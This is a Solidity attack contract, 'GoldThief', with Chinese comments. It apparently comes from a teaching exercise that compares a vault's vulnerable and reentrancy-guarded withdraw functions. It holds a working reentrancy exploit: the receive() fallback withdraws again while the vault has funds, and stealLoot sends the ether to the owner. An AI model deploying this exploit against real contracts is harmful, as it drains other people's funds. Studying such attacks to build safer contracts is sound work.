// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVault//接口设置，声明接口，可以把金库的合约地址当作 IVault 接口直接调用这些函数
{
    function deposit() external payable;
    function vulnerableWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief 
{
    IVault public targetVault;//目标地址
    address public owner;
    uint public attackCount;//重入循环的次数
    bool public attackingSafe;//若attackingSafe为false，我们攻击vulnerableWithdraw()，若为true，我们在测试safeWithdraw()——预计会失败

    constructor(address _vaultAddress) 
    {
        targetVault = IVault(_vaultAddress);
        //通过将要攻击的金库地址转换为 IVault，我们可以调用目标上的 deposit()、vulnerableWithdraw()、safeWithdraw()
        owner = msg.sender;
    }

    function attackVulnerable() external payable 
    {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false;//针对易受攻击版本的攻击
        attackCount = 0;

        targetVault.deposit{value: msg.value}();//存入1
        targetVault.vulnerableWithdraw();//触发提现receive() 
    }

    function attackSafe() external payable //重复提取失败
    {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        attackCount = 0;

        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    receive() external payable //攻击循环的核心
    {
        attackCount++;

        if (!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.vulnerableWithdraw();//收到ETH会再次发起提现
        }

        if (attackingSafe) {
            targetVault.safeWithdraw(); // This will fail due to nonReentrant
        }
    }

    function stealLoot() external //提现到私人钱包
    {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() external view returns (uint256) 
    {
        return address(this).balance;
    }
}
